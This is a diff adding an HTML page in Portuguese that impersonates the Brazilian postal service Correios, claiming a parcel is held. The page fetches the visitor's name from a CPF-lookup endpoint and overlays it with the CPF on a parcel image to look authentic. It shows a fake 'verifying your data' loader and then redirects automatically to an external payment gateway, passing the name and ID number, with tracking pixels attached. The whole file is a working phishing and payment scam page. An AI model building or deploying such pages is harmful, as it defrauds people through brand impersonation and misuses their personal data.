@@ -1,0 +1,338 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Correios - Encomenda Localizada</title>
+  <script>
+    window.pixelId = "6a347c1d62a4a0f4b2d647e4";
+    window.utmify = window.utmify || function() { (window.utmify.q = window.utmify.q || []).push(arguments); };
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+    window.utmify('track', 'InitiateCheckout');
+  </script><script async="" defer="" src="js/pixel.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #e8e8e8;
+      font-family: Arial, Helvetica, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding: 0;
+    }
+
+    .email-wrapper {
+      width: 100%;
+      max-width: 420px;
+      background-color: #ffffff;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+
+    /* Header */
+    .header-img {
+      width: 100%;
+      display: block;
+    }
+
+    /* Imagem do Topo (Rastreio e Descrição) */
+    .top-info-container {
+      width: 100%;
+      display: block;
+    }
+
+    .top-info-container img {
+      width: 100%;
+      display: block;
+      height: auto;
+    }
+
+    /* Imagem da Encomenda */
+    .package-photo {
+      max-width: 85%;
+      margin: 0 auto 18px;
+      border: 1px solid #dddddd;
+      border-radius: 4px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .package-photo img {
+      width: 100%;
+      display: block;
+      object-fit: cover;
+    }
+
+    .package-nome-overlay {
+      position: absolute;
+      top: 47.5%;
+      left: 17%;
+      transform: rotate(1deg);
+      width: 70%;
+      text-align: left;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: clamp(0.5rem, 3vw, 0.8rem);
+      font-weight: 700;
+      color: #1a1a1a;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      line-height: 1.3;
+      pointer-events: none;
+    }
+
+    .package-cpf-overlay {
+      position: absolute;
+      top: 56%;
+      left: 25%;
+      transform: rotate(1deg);
+      width: 70%;
+      text-align: left;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: clamp(0.5rem, 3vw, 0.8rem);
+      font-weight: 700;
+      color: #1a1a1a;
+      letter-spacing: 0.04em;
+      pointer-events: none;
+    }
+
+    /* Imagem do Aviso Importante */
+    .importante-container {
+      margin: 0 20px 18px;
+      display: block;
+    }
+
+    .importante-container img {
+      width: 100%;
+      display: block;
+      height: auto;
+    }
+
+    /* Seção do Botão em Imagem */
+    .cta-image-wrap {
+      padding: 0 20px 22px;
+    }
+
+    .cta-image-button {
+      display: block;
+      width: 100%;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+    }
+
+    .cta-image-button img {
+      width: 100%;
+      display: block;
+      height: auto;
+    }
+
+    /* Footer com Imagem */
+    .footer-container {
+      width: 100%;
+      display: block;
+    }
+
+    .footer-container img {
+      width: 100%;
+      display: block;
+      height: auto;
+    }
+
+    /* ── Loading overlay ── */
+    #loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    #loading-overlay.ativo { display: flex; }
+
+    .lo-topo {
+      width: 100%;
+      height: 4px;
+      background: #003087;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
+    .lo-barra {
+      height: 4px;
+      background: #FFCC00;
+      width: 0%;
+      animation: lo-progress 3s ease-in-out forwards;
+    }
+    @keyframes lo-progress { 0%{width:0%} 60%{width:75%} 90%{width:90%} 100%{width:95%} }
+
+    .lo-logo-img {
+      width: 180px;
+      margin-bottom: 28px;
+    }
+    .lo-divisor {
+      width: 180px;
+      height: 2px;
+      background: #FFCC00;
+      margin-bottom: 22px;
+    }
+    .lo-step {
+      font-size: 0.82rem;
+      color: #666;
+      text-align: center;
+      letter-spacing: 0.01em;
+      min-height: 1.2em;
+    }
+    .lo-dots::after {
+      content: '';
+      animation: lo-dot 1.2s steps(4, end) infinite;
+    }
+    @keyframes lo-dot {
+      0%  { content: ''; }
+      25% { content: '.'; }
+      50% { content: '..'; }
+      75% { content: '...'; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading overlay -->
+  <div id="loading-overlay" class="ativo">
+    <div class="lo-topo">
+        <div class="lo-barra" id="lo-barra"></div>
+    </div>
+    <img class="lo-logo-img" src="images/correios.png" alt="Correios">
+    <div class="lo-divisor"></div>
+    <div class="lo-step lo-dots" id="lo-msg">Verificando seus dados</div>
+</div>
+
+<script>
+const mensagens = [
+    "Verificando seus dados",
+    "Localizando encomenda",
+    "Gerando código de pagamento"
+];
+
+const msg = document.getElementById("lo-msg");
+
+mensagens.forEach((texto, index) => {
+    setTimeout(() => {
+        msg.textContent = texto;
+    }, index * 1200);
+});
+
+setTimeout(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+
+    const nome = urlParams.get("nome")
+        ? decodeURIComponent(urlParams.get("nome"))
+        : "";
+
+    const cpf = urlParams.get("cpf")
+        ? urlParams.get("cpf")
+        : "";
+
+    urlParams.set("name", nome);
+    urlParams.set("document", cpf);
+
+    const finalUrl =
+        "https://pay.sunize.com.br/uujSGmCC?" +
+        urlParams.toString();
+
+    window.location.href = finalUrl;
+}, 3600);
+</script>
+
+  <div class="email-wrapper">
+
+    <img src="images/image%20copy.png" alt="Correios" class="header-img">
+
+    <div class="top-info-container">
+      <img src="images/mS42K4y.png" alt="Informações da Encomenda">
+    </div>
+
+    <div class="package-photo">
+      <img src="images/image.png" alt="Encomenda Correios">
+      <div class="package-nome-overlay" id="texto-nome"></div>
+      <div class="package-cpf-overlay" id="texto-cpf"></div>
+    </div>
+
+    <div class="importante-container">
+      <img src="images/qystkyS.png" alt="Aviso Importante - Correios">
+    </div>
+
+    <div class="cta-image-wrap">
+      <a href="#" class="cta-image-button" id="btn-pagar">
+        <img src="images/cEn15gK.png" alt="CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO">
+      </a>
+    </div>
+
+    <div class="footer-container">
+      <img src="images/M3dE1nq.png" alt="Rodapé Correios - Ambiente Seguro">
+    </div>
+
+  </div>
+  <script>
+    const params = new URLSearchParams(location.search);
+    const cpf = params.get('cpf') || '';
+    let nomeGlobal = '';
+
+    // Carrega nome na imagem
+    (async function () {
+      if (!cpf) return;
+      try {
+        const res  = await fetch('/api/consulta?cpf=' + encodeURIComponent(cpf));
+        const data = await res.json();
+        if (!data.erro && data.dados && data.dados.length > 0) {
+          nomeGlobal = data.dados[0].NOME;
+          const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+          document.getElementById('texto-nome').textContent = nomeGlobal;
+          document.getElementById('texto-cpf').textContent  = cpfFormatado;
+        }
+      } catch (e) {}
+    })();
+
+    // Animação de carregamento ao clicar no botão
+    document.getElementById('btn-pagar').addEventListener('click', function (e) {
+      e.preventDefault();
+
+      const overlay = document.getElementById('loading-overlay');
+      const s1 = document.getElementById('step1');
+      const s2 = document.getElementById('step2');
+      const s3 = document.getElementById('step3');
+
+      overlay.classList.add('ativo');
+      // Reinicia animação da barra
+      const barra = document.getElementById('lo-barra');
+      barra.style.animation = 'none';
+      barra.offsetHeight;
+      barra.style.animation = '';
+
+      const msg = document.getElementById('lo-msg');
+      setTimeout(function () { msg.textContent = 'Localizando encomenda'; }, 1200);
+      setTimeout(function () { msg.textContent = 'Gerando código de pagamento'; }, 2400);
+
+      setTimeout(function () {
+        var gatewayBase = 'https://pay.sunize.com.br/uujSGmCC';
+        var urlParams   = new URLSearchParams(window.location.search);
+        var utmKeys     = ['utm_source','utm_campaign','utm_medium','utm_content','utm_term','xcod','src','fbclid','sck','subid'];
+        var q           = new URLSearchParams();
+        utmKeys.forEach(function(k){
+          var v = urlParams.get(k) || localStorage.getItem(k) || '';
+          if (v) q.set(k, v);
+        });
+        var qs = q.toString();
+        window.location.href = gatewayBase + (qs ? '?' + qs : '');
+      }, 1);
+    });
+  </script>
+
+</body></html>
